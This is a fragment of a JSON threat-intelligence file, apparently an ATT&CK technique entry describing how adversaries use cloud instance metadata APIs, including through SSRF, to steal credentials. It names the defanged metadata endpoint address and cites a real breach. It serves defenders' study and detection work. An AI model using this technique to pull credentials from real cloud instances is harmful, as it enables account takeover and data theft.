                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        }
    ]
}
]